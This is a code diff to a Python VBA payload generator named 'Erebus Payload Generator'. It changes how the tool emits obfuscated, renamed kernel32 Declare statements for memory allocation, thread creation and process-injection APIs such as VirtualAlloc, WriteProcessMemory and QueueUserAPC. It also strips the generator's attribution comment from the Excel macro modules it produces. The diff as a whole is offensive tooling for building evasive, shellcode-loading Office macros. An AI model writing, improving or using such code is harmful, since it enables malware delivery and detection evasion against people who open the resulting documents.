@@ -566,13 +566,37 @@ p{random.randint(1000,9999)} = Array(1,2,3,4,5)
             'EnumSystemLocalesA': f'v{random.randint(10000, 99999)}Locales',
         }
         
+        # Collect Declare statements separately
+        declare_statements = []
+        
         # Only obfuscate APIs that are actually used in the code
         for api, obfuscated_name in api_replacements.items():
             if api in obfuscated:
-                # Add Declare statement at the beginning
-                obfuscated = f'Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "{api}" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n' + obfuscated
-                # Replace API call with obfuscated name
+                # Create proper Declare statement based on API type
+                if api == 'VirtualAlloc':
+                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "VirtualAlloc" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr'
+                elif api == 'RtlMoveMemory':
+                    declare = f'Private Declare PtrSafe Sub {obfuscated_name} Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)'
+                elif api == 'CreateThread':
+                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "CreateThread" (ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Any) As LongPtr'
+                elif api == 'VirtualAllocEx':
+                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr'
+                elif api == 'WriteProcessMemory':
+                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Any) As Long'
+                elif api == 'QueueUserAPC':
+                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "QueueUserAPC" (ByVal pfnAPC As LongPtr, ByVal hThread As LongPtr, ByVal dwData As LongPtr) As Long'
+                elif api == 'EnumSystemLocalesA':
+                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "EnumSystemLocalesA" (ByVal lpLocaleEnumProc As LongPtr, ByVal dwFlags As Long) As Long'
+                else:
+                    declare = f'Private Declare PtrSafe Function {obfuscated_name} Lib "kernel32" Alias "{api}" () As LongPtr'
+                
+                declare_statements.append(declare)
+                # Replace API call with obfuscated name in the code
                 obfuscated = obfuscated.replace(api, obfuscated_name)
+        
+        # Add Declare statements at the very beginning (before any Sub definitions)
+        if declare_statements:
+            obfuscated = '\n'.join(declare_statements) + '\n\n' + obfuscated
         
         return obfuscated
 
@@ -1194,11 +1218,6 @@ End Sub
         
         # .bas files have a specific header format
         bas_content = f"""Attribute VB_Name = "{module_name}"
-'''
-Module: {module_name}
-Author: Erebus Payload Generator
-Description: VBA Payload Module - Import into Excel VBA Editor
-'''
 
 {vba_code}
 """
